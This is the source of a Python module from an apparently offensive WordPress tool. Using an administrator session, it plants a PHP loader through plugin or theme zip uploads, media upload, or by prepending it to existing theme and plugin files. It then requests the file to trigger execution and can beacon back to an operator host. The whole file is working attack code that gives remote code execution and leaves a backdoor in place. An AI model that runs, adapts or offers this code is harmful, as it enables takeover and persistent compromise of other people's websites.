"""
HWP Core — AUTH-to-RCE Adapter.

The direct-HTTP twin of the XSS→RCE adapter (lib/adapter.py). Where the XSS
adapter runs its delivery sinks *in a victim admin's browser* via injected JS,
this one runs the same sinks *from the operator's machine* using a stored
**administrator** session — plain authenticated HTTP requests, no exploit and no
victim required.

It solves the "I already have admin cookies, just give me RCE" case:

    hwp -t http://target --payload webshell --auth-rce-adapter
    hwp -t http://target --payload webshell --auth-rce-adapter --lhost 10.0.0.5 --lport 8888

The payload is UNCHANGED and owns its PHP. The adapter wraps that PHP in the same
gated beacon loader used by the XSS adapter (reused verbatim from
lib.adapter.build_loader), delivers it through the first reachable admin sink,
and VERIFIES it by requesting the written file with ?hwp-beacon=1 — a write that
can't be reached is not a success. With --lhost set, the loader's server-side
call-home also confirms execution to the operator's BeaconServer.

Sinks, tried in reliability order (mirrors the XSS adapter):
    1. plugin-upload  — install a throwaway .zip plugin carrying the loader
    2. theme-upload   — install a throwaway .zip theme carrying the loader
    3. media-upload   — upload the loader .php to wp-content/uploads/
    4. theme-editor   — prepend the loader atop an existing theme file
    5. plugin-editor  — prepend the loader atop an existing plugin file

Requires an administrator-capability session (upload/editor screens are
admin-only; media-upload of a .php also needs unfiltered_upload).
"""

import io
import re
import zipfile
import html as _html

import requests

from lib import adapter as _adapter
from lib import output
from lib.result import Result


LOADER_NAME = "hwp-loader.php"


class AuthRCEAdapter:
    """Deliver an RCE (PHP) instruction via a stored admin session."""

    def __init__(self, target, session_cookies, options, verbose=0):
        self.target = target.rstrip("/")
        self.options = options or {}
        self.verbose = verbose
        self.lhost = self.options.get("lhost", "")
        self.lport = self.options.get("lport", "8888")
        self._debug = bool(self.options.get("adapter-debug") or self.options.get("adapter_debug"))
        self.s = requests.Session()
        self.s.cookies.update(session_cookies or {})
        self.s.headers.update({"User-Agent": "Mozilla/5.0 (hwp auth-adapter)"})

    # ── tiny helpers ─────────────────────────────────────────────────
    def _dbg(self, msg):
        if self._debug:
            output.info(f"[auth-adapter] {msg}")

    def _get(self, path, **kw):
        kw.setdefault("timeout", 20)
        return self.s.get(self.target + path, **kw)

    def _post(self, path, **kw):
        kw.setdefault("timeout", 30)
        return self.s.post(self.target + path, **kw)

    @staticmethod
    def _nonce(html_text, name):
        """Scrape a hidden nonce field's value (handles either attribute order)."""
        if not html_text:
            return None
        for pat in (
            r'name=["\']?%s["\']?[^>]*?\svalue=["\']([a-zA-Z0-9]+)["\']' % re.escape(name),
            r'value=["\']([a-zA-Z0-9]+)["\'][^>]*?\sname=["\']?%s["\']?' % re.escape(name),
        ):
            m = re.search(pat, html_text)
            if m:
                return m.group(1)
        return None

    @staticmethod
    def _textarea(html_text, name="newcontent"):
        """Pull the current file content out of an editor <textarea>, HTML-decoded."""
        m = re.search(
            r'<textarea[^>]*\bname=["\']?%s["\']?[^>]*>([\s\S]*?)</textarea>' % re.escape(name),
            html_text or "", re.IGNORECASE,
        )
        return _html.unescape(m.group(1)) if m else ""

    @staticmethod
    def _zip(files):
        """Build an in-memory .zip from {arcname: bytes}."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            for arc, data in files.items():
                z.writestr(arc, data)
        return buf.getvalue()

    def _fire(self, url):
        """Request the written loader with ?hwp-beacon=1 to trigger + verify it.

        Returns the parsed beacon dict on success (loader ran and reported),
        else None (unreachable / not our loader).
        """
        sep = "&" if "?" in url else "?"
        try:
            r = self.s.get(url + sep + "hwp-beacon=1", timeout=20)
        except Exception as e:
            self._dbg(f"fire {url} error: {e}")
            return None
        if r.status_code != 200:
            self._dbg(f"fire {url} -> {r.status_code} (unreachable)")
            return None
        body = r.text or ""
        if '"hwp":true' not in body and '"hwp": true' not in body:
            self._dbg(f"fire {url} reachable but no hwp flag")
            return None
        try:
            import json
            return json.loads(body)
        except Exception:
            return {"hwp": True, "raw": body[:200]}

    # ── sinks ────────────────────────────────────────────────────────
    def _sink_plugin_upload(self, loader):
        h = self._get("/wp-admin/plugin-install.php")
        nonce = self._nonce(h.text, "_wpnonce")
        if not nonce:
            self._dbg("plugin-upload: no nonce")
            return None
        slug = "hwp" + _adapter._b64(loader)[:6].lower().replace("+", "a").replace("/", "b").replace("=", "c")
        slug = re.sub(r"[^a-z0-9]", "", slug) or "hwploader"
        php = f'<?php /* Plugin Name: {slug} */ ?>\n' + loader
        z = self._zip({f"{slug}/{slug}.php": php.encode()})
        r = self._post(
            "/wp-admin/update.php?action=upload-plugin",
            data={"_wpnonce": nonce, "install-plugin-submit": "Install Now"},
            files={"pluginzip": (f"{slug}.zip", z, "application/zip")},
        )
        if r.status_code == 200:
            fired = self._fire(f"{self.target}/wp-content/plugins/{slug}/{slug}.php")
            if fired:
                return (f"wp-content/plugins/{slug}/{slug}.php", fired)
        return None

    def _sink_theme_upload(self, loader):
        h = self._get("/wp-admin/theme-install.php")
        nonce = self._nonce(h.text, "_wpnonce")
        if not nonce:
            self._dbg("theme-upload: no nonce")
            return None
        slug = "hwptheme" + re.sub(r"[^a-z0-9]", "", _adapter._b64(loader)[:5].lower()) or "hwptheme"
        z = self._zip({
            f"{slug}/style.css": f"/* Theme Name: {slug} */".encode(),
            f"{slug}/{LOADER_NAME}": loader.encode(),
        })
        r = self._post(
            "/wp-admin/update.php?action=upload-theme",
            data={"_wpnonce": nonce, "install-theme-submit": "Install Now"},
            files={"themezip": (f"{slug}.zip", z, "application/zip")},
        )
        if r.status_code == 200:
            fired = self._fire(f"{self.target}/wp-content/themes/{slug}/{LOADER_NAME}")
            if fired:
                return (f"wp-content/themes/{slug}/{LOADER_NAME}", fired)
        return None

    def _sink_media(self, loader):
        h = self._get("/wp-admin/media-new.php")
        nonce = self._nonce(h.text, "_wpnonce")
        r = self._post(
            "/wp-admin/async-upload.php",
            data={"_wpnonce": nonce or "", "action": "upload-attachment", "name": LOADER_NAME},
            files={"async-upload": (LOADER_NAME, loader.encode(), "application/x-php")},
        )
        if r.status_code == 200 and '"success":true' in (r.text or ""):
            m = re.search(r'"url":"([^"]+)"', r.text)
            if m:
                url = m.group(1).replace("\\/", "/")
                fired = self._fire(url)
                if fired:
                    return (url.replace(self.target, "").lstrip("/"), fired)
        return None

    def _sink_editor(self, loader, kind):
        """theme-editor / plugin-editor: prepend loader atop an existing file."""
        page = f"/wp-admin/{kind}-editor.php"
        h = self._get(page)
        if h.status_code != 200:
            return None
        nonce = self._nonce(h.text, "nonce")
        if not nonce:
            self._dbg(f"{kind}-editor: no nonce")
            return None

        if kind == "theme":
            items = re.findall(r'<option[^>]*value=["\']([^"\'>]+)["\']', h.text) or []
        else:
            items = re.findall(r'<option[^>]*value=["\']([^"\'>]+\.php)["\']', h.text) or []
        items = list(dict.fromkeys(items))[:4]

        for item in items:
            key = "theme" if kind == "theme" else "plugin"
            listing = self._get(page, params={key: item})
            files = re.findall(r'[?&]file=([^&"\'#]+\.php)', listing.text)
            files = list(dict.fromkeys(requests.utils.unquote(f) for f in files))
            if kind == "theme":
                pref = [f for f in ("404.php", "index.php", "functions.php") if f in files]
                files = pref + [f for f in files if f not in pref]
            for tgt in files[:4]:
                fpage = self._get(page, params={key: item, "file": tgt})
                fnonce = self._nonce(fpage.text, "nonce") or nonce
                orig = self._textarea(fpage.text)
                content = (loader + "\n" + orig) if orig else loader
                data = {
                    "nonce": fnonce, "_wp_http_referer": page,
                    "newcontent": content, "action": "update",
                    "file": tgt, key: item, "scrollto": "0",
                }
                if kind == "theme":
                    data["docs-list"] = ""
                self._post(page, data=data)
                if kind == "theme":
                    url = f"{self.target}/wp-content/themes/{item}/{tgt}"
                    rel = f"wp-content/themes/{item}/{tgt}"
                else:
                    # plugin file id is 'slug/file.php'
                    url = f"{self.target}/wp-content/plugins/{tgt}"
                    rel = f"wp-content/plugins/{tgt}"
                fired = self._fire(url)
                if fired:
                    return (rel, fired)
        return None

    # ── entry point ──────────────────────────────────────────────────
    def deliver(self, php_instruction):
        """Deliver one RCE (PHP) instruction. Returns a Result."""
        loader = _adapter.build_loader(php_instruction, self.lhost, self.lport)
        sinks = [
            ("plugin-upload", lambda: self._sink_plugin_upload(loader)),
            ("theme-upload", lambda: self._sink_theme_upload(loader)),
            ("media-upload", lambda: self._sink_media(loader)),
            ("theme-editor", lambda: self._sink_editor(loader, "theme")),
            ("plugin-editor", lambda: self._sink_editor(loader, "plugin")),
        ]
        for name, fn in sinks:
            self._dbg(f"trying sink: {name}")
            try:
                res = fn()
            except requests.RequestException as e:
                self._dbg(f"{name} request error: {e}")
                res = None
            if res:
                where, beacon = res
                output.success(f"AUTH→RCE: delivered via {name} → {where}")
                out = beacon.get("output") if isinstance(beacon, dict) else None
                return Result(
                    success=True,
                    url=f"{self.target}/{where}",
                    path=where,
                    output=out,
                    message=f"Loader executed via {name} at {where}",
                )
        return Result(success=False, message="AUTH→RCE: no admin sink was reachable")
